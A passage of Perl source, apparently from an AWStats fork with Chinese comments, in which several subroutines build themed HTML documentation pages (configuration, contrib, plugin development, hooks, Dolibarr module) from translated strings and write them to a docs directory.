    my ($dir) = @_;
    
    # 获取页面标题
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
    my $theme_script = get_theme_script();
    # ========== 文档基本信息 ==========
    my $doc_title = _t("docs.config.title");
    my $subtitle = _t("docs.config.subtitle");
    my $note = _t("docs.config.note");
    my $full_title = "$doc_title - $page_title";
    my $SPONSOR_SECTION = _t("sponsor.section");
    # ========== 内容 ==========
	my $config_full = _t("config.full");
    $config_full =~ s/\\n/\n/g;
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, config, configuration, directives, parameters">
    <title>$full_title</title>
    <style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--timeline-color:#3b82f6;--section-core:#8b5cf6;--section-optional:#10b981;--section-accuracy:#f59e0b;--code-bg:#f1f5f9;--version-badge:#6b7280;--card-bg:#ffffff;--accent:#2563eb}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--timeline-color:#60a5fa;--section-core:#a78bfa;--section-optional:#34d399;--section-accuracy:#fbbf24;--code-bg:#2d3748;--version-badge:#9ca3af;--card-bg:#1f2937;--accent:#60a5fa}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1400px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--timeline-color);padding-bottom:10px;font-size:2em}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:20px;font-size:1.1em}.note{background-color:var(--header-bg);border-left:4px solid var(--timeline-color);padding:15px;border-radius:8px;margin:20px 0}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.timeline{position:relative;padding:20px 0}.timeline::before{content:'';position:absolute;left:200px;top:0;bottom:0;width:2px;background:var(--timeline-color);opacity:0.3}.section-core,.section-optional,.section-accuracy{margin:40px 0 20px 220px;font-size:1.5em;font-weight:700;padding-bottom:8px;border-bottom:2px solid}.section-core{border-color:var(--section-core);color:var(--section-core)}.section-optional{border-color:var(--section-optional);color:var(--section-optional)}.section-accuracy{border-color:var(--section-accuracy);color:var(--section-accuracy)}.config-item{position:relative;margin-bottom:30px;padding-left:220px;min-height:80px}.config-version{position:absolute;left:10px;width:170px;text-align:right;font-weight:600;color:var(--timeline-color);font-size:0.9em;top:20px;padding-right:10px;white-space:normal;word-wrap:break-word;line-height:1.4;background:transparent}.config-marker{position:absolute;left:197px;width:12px;height:12px;border-radius:50%;background:var(--timeline-color);border:2px solid var(--bg-color);box-shadow:0 0 0 2px var(--timeline-color);z-index:2;top:20px}.config-content{background:var(--header-bg);border:1px solid var(--border-color);border-radius:12px;padding:20px;transition:transform 0.2s,box-shadow 0.2s;margin-left:0}.config-content:hover{transform:translateX(5px);box-shadow:0 4px 12px rgba(0,0,0,0.1)}.config-name{font-size:1.3em;font-weight:700;color:var(--timeline-color);margin-bottom:10px}.config-desc{margin:10px 0}.config-desc ul{margin:5px 0 10px 0;padding-left:20px}.config-desc li{margin:3px 0}.config-example{background:var(--code-bg);padding:8px 12px;border-radius:6px;font-family:'Monaco','Menlo',monospace;font-size:0.9em;margin:8px 0;border:1px solid var(--border-color)}.config-default{background:var(--code-bg);padding:6px 10px;border-radius:6px;font-size:0.9em;margin:5px 0;border:1px solid var(--border-color);display:inline-block}.section{margin:40px 0;padding:25px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--bg-color);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}.donate-button{display:inline-flex;align-items:center;gap:8px;background:var(--link-color);color:white;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:1em;transition:opacity 0.2s}.donate-button:hover{opacity:0.9}\@media (max-width:768px){.timeline::before{left:120px}.config-item{padding-left:140px}.config-version{left:5px;width:100px;font-size:0.8em}.config-marker{left:117px}.section-core,.section-optional,.section-accuracy{margin-left:140px}}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    <div class="subtitle">$subtitle</div>
    <div class="note">$note</div>
	<div class="timeline">
		$config_full
	</div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_config.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_config.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 contrib 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_contrib_doc {
    my ($dir) = @_;
    
    # 获取页面标题
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
    my $theme_script = get_theme_script();
    
    # ========== 文档基本信息 ==========
    my $doc_title = _t("docs.contrib.title");
    my $subtitle = _t("docs.contrib.subtitle");
    my $content = _t("docs.contrib.content");
    my $full_title = "$doc_title - $page_title";
    my $SPONSOR_SECTION = _t("sponsor.section");
    
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, plugins, contrib, resources, geoip, maxmind">
    <title>$full_title</title>
    <style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--plugin-standard:#3b82f6;--plugin-geoip:#10b981;--contrib-bg:#fef3c7;--related-bg:#dbeafe;--doc-bg:#e0f2fe;--sponsor-bg:#fae8ff}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--plugin-standard:#60a5fa;--plugin-geoip:#34d399;--contrib-bg:#5f4c1e;--related-bg:#1e3a5f;--doc-bg:#0b5e6b;--sponsor-bg:#4a1e4a}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--link-color);padding-bottom:10px;font-size:2em}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:30px;font-size:1.1em}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;box-shadow:0 2px 4px rgba(0,0,0,0.05)}.section h2{margin-top:0;color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:10px;font-size:1.5em}.section h3{margin:20px 0 10px;color:var(--link-color);font-size:1.2em}.plugin-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:20px;margin:20px 0}.plugin-card{background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px;padding:15px;transition:transform 0.2s,box-shadow 0.2s}.plugin-card:hover{transform:translateY(-2px);box-shadow:0 4px 8px rgba(0,0,0,0.1)}.plugin-card ul{margin:0;padding:0;list-style:none}.plugin-card li{margin:8px 0;padding-left:20px;position:relative}.plugin-card li::before{content:"•";color:var(--link-color);font-weight:bold;position:absolute;left:4px}.plugin-card li:first-child{margin-top:0}.plugin-card li strong{color:var(--link-color)}.plugin-card.code-block{background-color:var(--code-bg);font-family:monospace;padding:10px;border-radius:4px;margin:10px 0}.badge{display:inline-block;padding:2px 8px;border-radius:12px;font-size:0.8em;font-weight:600;margin-right:5px}.badge.standard{background-color:var(--plugin-standard);color:white}.badge.geoip{background-color:var(--plugin-geoip);color:white}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:15px;border-radius:4px;margin:15px 0}.info-box ul,.info-box ol{margin:5px 0;padding-left:20px}.info-box li{margin:5px 0}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}.footer-note{margin-top:40px;padding:20px;background-color:var(--header-bg);border-radius:8px;text-align:center;font-size:0.9em}\@media (max-width:768px){.plugin-grid{grid-template-columns:1fr}}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    <div class="subtitle">$subtitle</div>
    
    $content
    
    <div id="sponsor" class="section">
        $SPONSOR_SECTION
    </div>
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_contrib.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_contrib.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 devgraphs 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_devgraphs_doc {
    my ($dir) = @_;
    
    # 获取页面标题
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
    my $theme_script = get_theme_script();
    # ========== 文档基本信息 ==========
    my $doc_title = _t("docs.devgraphs.title");
    my $subtitle = _t("docs.devgraphs.subtitle");
    my $full_title = "$doc_title - $page_title";
    my $SPONSOR_SECTION = _t("sponsor.section");
    # ========== 介绍 ==========
    my $intro = _t("devgraphs.intro");
    my $variables_title = _t("devgraphs.variables.title");
    my $variables_desc = _t("devgraphs.variables.desc");
    
    # ========== 变量说明 ==========
	my $devgraphs_variables = _t("devgraphs.variables.list");
    
    # ========== 图形类型 ==========
    my $devgraphs_types = _t("devgraphs.types.list");
    
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, plugins, development, graphs, charts, maps">
    <title>$full_title</title>
    <style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--section-title:#3b82f6}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--section-title:#60a5fa}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--link-color);padding-bottom:10px;font-size:2em}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:30px;font-size:1.1em}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;box-shadow:0 2px 4px rgba(0,0,0,0.05)}.section h2{margin-top:0;color:var(--section-title);border-bottom:1px solid var(--border-color);padding-bottom:10px;font-size:1.5em}.section h3{margin:20px 0 10px;color:var(--link-color);font-size:1.2em}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:15px;border-radius:4px;margin:15px 0}.info-box p{margin:10px 0}.info-box p:first-child{margin-top:0}.info-box p:last-child{margin-bottom:0}.variable-list{list-style:none;padding:0;margin:0}.variable-list li{margin:20px 0;padding:15px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px;transition:transform 0.2s}.variable-list li:hover{transform:translateX(5px);box-shadow:0 2px 8px rgba(0,0,0,0.1)}.variable-list li strong{color:var(--link-color);font-size:1.1em}.type-list{list-style:none;padding:0;margin:0;display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:15px}.type-list li{padding:15px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px;transition:transform 0.2s}.type-list li:hover{transform:translateY(-2px);box-shadow:0 4px 8px rgba(0,0,0,0.1)}.type-list li strong{color:var(--link-color);font-size:1.1em}.type-list ul{margin:10px 0 0;padding-left:20px}.type-list ul li{padding:3px 0;background:none;border:none}.type-list ul li:hover{transform:none;box-shadow:none}pre{background-color:var(--code-bg);padding:10px;border-radius:4px;overflow-x:auto;border:1px solid var(--border-color);font-family:'Monaco','Menlo',monospace}code{background-color:var(--code-bg);padding:2px 4px;border-radius:4px;font-family:'Monaco','Menlo',monospace}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}\@media (max-width:768px){.type-list{grid-template-columns:1fr}}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
    </style>
    <link href="scripts/prettify.css" type="text/css" rel="stylesheet">
</head>
<body onload="prettyPrint()">
    <h1>$doc_title</h1>
    <div class="subtitle">$subtitle</div>
    
    <!-- ==================== 介绍 ==================== -->
    <div class="section">
        <div class="info-box">
            $intro
        </div>
    </div>
    
    <!-- ==================== 变量说明 ==================== -->
	<div class="section">
		$devgraphs_variables
	</div>
    
    <!-- ==================== 图形类型 ==================== -->
    <div class="section">
		$devgraphs_types
	</div>
		
    <hr>
    
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
    
    <script src="scripts/prettify.js"></script>
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_dev_plugins_graphs.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_dev_plugins_graphs.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 devhooks 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_devhooks_doc {
    my ($dir) = @_;
    
    # 获取页面标题
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
    my $theme_script = get_theme_script();
    # ========== 文档基本信息 ==========
    my $doc_title = _t("docs.devhooks.title");
    my $subtitle = _t("docs.devhooks.subtitle");
    my $full_title = "$doc_title - $page_title";
    my $SPONSOR_SECTION = _t("sponsor.section");
    # ========== 内容 ==========
	my $devhooks_full = _t("devhooks.full");
    $devhooks_full =~ s/\\n/\n/g;
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, plugins, development, hooks, api">
    <title>$full_title</title>
    <style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--section-required:#3b82f6;--section-common:#10b981;--section-processing:#f59e0b;--section-output:#8b5cf6}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--section-required:#60a5fa;--section-common:#34d399;--section-processing:#fbbf24;--section-output:#a78bfa}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--link-color);padding-bottom:10px;font-size:2em}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:30px;font-size:1.1em}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;box-shadow:0 2px 4px rgba(0,0,0,0.05)}.section h2{margin-top:0;padding-bottom:10px;border-bottom:2px solid;font-size:1.5em}.section-required h2{border-color:var(--section-required);color:var(--section-required)}.section-common h2{border-color:var(--section-common);color:var(--section-common)}.section-processing h2{border-color:var(--section-processing);color:var(--section-processing)}.section-output h2{border-color:var(--section-output);color:var(--section-output)}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px;margin:20px 0}.info-box p{margin:10px 0}.info-box p:first-child{margin-top:0}.info-box p:last-child{margin-bottom:0}.hook-list{list-style:none;padding:0;margin:0}.hook-list > li{margin:20px 0;padding:20px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px;transition:transform 0.2s,box-shadow 0.2s}.hook-list > li:hover{transform:translateX(5px);box-shadow:0 4px 12px rgba(0,0,0,0.1)}.hook-list > li > strong{color:var(--link-color);font-size:1.2em;display:block;margin-bottom:10px}.hook-list ul{margin:10px 0 0;padding-left:20px;list-style:disc}.hook-list ul li{margin:5px 0;padding:0;background:none;border:none}.hook-list ul li:hover{transform:none;box-shadow:none}pre{background-color:var(--code-bg);padding:12px;border-radius:6px;overflow-x:auto;border:1px solid var(--border-color);font-family:'Monaco','Menlo',monospace;font-size:0.9em;margin:10px 0}code{background-color:var(--code-bg);padding:2px 4px;border-radius:4px;font-family:'Monaco','Menlo',monospace}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}\@media (max-width:768px){.doc-nav{flex-direction:column;gap:5px}}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    <div class="subtitle">$subtitle</div>
    
	<div class="container">
		$devhooks_full
	</div>
    
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
    
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_dev_plugins_hooks.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_dev_plugins_hooks.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 devplugins 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_devplugins_doc {
    my ($dir) = @_;
    
    # 获取页面标题
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
    my $theme_script = get_theme_script();
    # ========== 文档基本信息 ==========
    my $doc_title = _t("docs.devplugins.title");
    my $subtitle = _t("docs.devplugins.subtitle");
    my $full_title = "$doc_title - $page_title";
    my $SPONSOR_SECTION = _t("sponsor.section");

    # ========== 介绍 ==========
    my $intro = _t("devplugins.intro");
    
    # ========== 导航链接 ==========
    my $nav_location = _t("devplugins.nav.location");
    my $nav_hooks = _t("devplugins.nav.hooks");
    my $nav_variables = _t("devplugins.nav.variables");
    my $nav_accessible_vars = _t("devplugins.nav.accessible_vars");
    my $nav_accessible_funcs = _t("devplugins.nav.accessible_funcs");
    
    # ========== 插件文件位置 ==========
    my $location_title = _t("devplugins.location.title");
    my $location_content = _t("devplugins.location.content");
       $location_content =~ s/\\n/\n/g;
    # ========== 钩子 ==========
    my $hooks_title = _t("devplugins.hooks.title");
    my $hooks_content = _t("devplugins.hooks.content");
    
    # ========== 必需变量 ==========
    my $variables_title = _t("devplugins.variables.title");
    my $devplugins_variables = _t("devplugins.variables.full");
	$devplugins_variables =~ s/\\n/\n/g;
    # ========== 可访问变量 ==========
    my $accessible_vars_title = _t("devplugins.accessible_vars.title");
    my $accessible_vars_content = _t("devplugins.accessible_vars.content");
    
    # ========== 可访问函数 ==========
    my $accessible_funcs_title = _t("devplugins.accessible_funcs.title");
    my $devplugins_functions = _t("devplugins.functions.full");
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, plugins, development, api, hooks">
    <title>$full_title</title>
    <style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--section-location:#3b82f6;--section-hooks:#10b981;--section-variables:#f59e0b;--section-accessible:#8b5cf6;--section-functions:#ec4899}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--section-location:#60a5fa;--section-hooks:#34d399;--section-variables:#fbbf24;--section-accessible:#a78bfa;--section-functions:#f472b6}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1{color:var(--text-color);border-bottom:2px solid var(--link-color);padding-bottom:10px;font-size:2em}.subtitle{color:var(--text-color);opacity:0.8;font-style:italic;margin-bottom:30px;font-size:1.1em}.doc-nav{margin:20px 0;padding:15px;background-color:var(--header-bg);border-radius:8px;border:1px solid var(--border-color);display:flex;gap:15px;flex-wrap:wrap;position:sticky;top:0;z-index:10;backdrop-filter:blur(10px)}.doc-nav a{color:var(--link-color);text-decoration:none;padding:5px 10px;border-radius:4px;transition:background-color 0.2s}.doc-nav a:hover{background-color:var(--border-color)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;box-shadow:0 2px 4px rgba(0,0,0,0.05)}.section h2{margin-top:0;padding-bottom:10px;border-bottom:2px solid;font-size:1.5em}.section-location h2{border-color:var(--section-location);color:var(--section-location)}.section-hooks h2{border-color:var(--section-hooks);color:var(--section-hooks)}.section-variables h2{border-color:var(--section-variables);color:var(--section-variables)}.section-accessible-vars h2{border-color:var(--section-accessible);color:var(--section-accessible)}.section-accessible-funcs h2{border-color:var(--section-functions);color:var(--section-functions)}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px;margin:20px 0}.info-box p{margin:10px 0}.info-box p:first-child{margin-top:0}.info-box p:last-child{margin-bottom:0}pre{background-color:var(--code-bg);padding:15px;border-radius:8px;overflow-x:auto;border:1px solid var(--border-color);font-family:'Monaco','Menlo',monospace;font-size:0.9em;margin:15px 0}code{background-color:var(--code-bg);padding:2px 6px;border-radius:4px;font-family:'Monaco','Menlo',monospace}.variable-list{list-style:none;padding:0;margin:15px 0}.variable-list li{margin:15px 0;padding:15px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px;transition:transform 0.2s}.variable-list li:hover{transform:translateX(5px);box-shadow:0 2px 8px rgba(0,0,0,0.1)}.variable-list li strong{color:var(--link-color);font-size:1.1em}.variable-list ul{margin:10px 0 0;padding-left:20px}.variable-list ul li{margin:5px 0;padding:0;background:none;border:none}.function-list{list-style:none;padding:0;margin:15px 0;display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:15px}.function-list li{padding:15px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px;transition:transform 0.2s}.function-list li:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,0.1)}.function-list li strong{color:var(--link-color);font-size:1.1em;display:block;margin-bottom:8px}hr{border:none;border-top:1px solid var(--border-color);margin:30px 0}\@media (max-width:768px){.function-list{grid-template-columns:1fr}}a,a:link,a:visited{text-decoration:none;color:var(--link-color);transition:color 0.2s ease}a:hover{color:var(--accent)}.section{margin:40px 0;padding:25px;background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.info-box{background-color:var(--header-bg);border-left:4px solid var(--link-color);padding:20px;border-radius:8px}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    <div class="subtitle">$subtitle</div>
    
    <div class="info-box">
        $intro
    </div>
    
    <div id="location" class="section section-location">
        <h2>$location_title</h2>
        <div class="info-box">
            $location_content
        </div>
    </div>
    
    <div id="hooks" class="section section-hooks">
        <h2>$hooks_title</h2>
        <div class="info-box">
            $hooks_content
        </div>
    </div>
    
    <div id="variables" class="section section-variables">
        <h2>$variables_title</h2>
		<div class="section">
			$devplugins_variables
		</div>
    </div>
    
    <div id="accessible-vars" class="section section-accessible-vars">
        <h2>$accessible_vars_title</h2>
        <div class="info-box">
            $accessible_vars_content
        </div>
    </div>
    
    <div id="accessible-funcs" class="section section-accessible-funcs">
        <h2>$accessible_funcs_title</h2>
        <div class="section">
			$devplugins_functions
		</div>
    </div>
    
    <hr>
    
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
    
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_dev_plugins.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_dev_plugins.html in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# 生成 dolibarr 文档页面
# Parameters: $dir (统计目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_dolibarr_doc {
    my ($dir) = @_;
    
    # 获取页面标题
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
    my $theme_script = get_theme_script();
    # ========== 文档基本信息 ==========
    my $doc_title = _t("docs.dolibarr.title");
    my $full_title = "$doc_title - $page_title";
    my $SPONSOR_SECTION = _t("sponsor.section");
    # ========== 模块介绍 ==========
	my $dolibarr_full = _t("dolibarr.full");
    
    # 获取语言和方向
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats Dolibarr 模块文档">
    <meta name="keywords" content="awstats, dolibarr, erp, crm, module, plugin">
    <title>$full_title</title>
    <style>
	:root{--bg-color:#ffffff;--text-color:#1f2937;--text-secondary:#6b7280;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--card-bg:#ffffff;--code-bg:#f1f5f9;--accent:#3b82f6;--surface:#ffffff;--surface-secondary:#f9fafb;--step-bg:#f3f4f6;--step-number:#3b82f6;--badge-bg:#e5e7eb}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--text-secondary:#9ca3af;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--card-bg:#2d3748;--code-bg:#2d3748;--accent:#60a5fa;--surface:#2d3748;--surface-secondary:#1f2937;--step-bg:#374151;--step-number:#60a5fa;--badge-bg:#374151}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1200px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}.container{width:100%}h1{color:var(--text-color);border-bottom:2px solid var(--accent);padding-bottom:10px;font-size:2em;margin-bottom:30px}h2{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:8px;font-size:1.5em;margin:30px 0 20px}h3{color:var(--text-color);font-size:1.3em;margin:25px 0 15px}.doc-card{background-color:var(--card-bg);border:1px solid var(--border-color);border-radius:12px;padding:25px;margin-bottom:30px}.module-card{background-color:var(--surface-secondary);border:1px solid 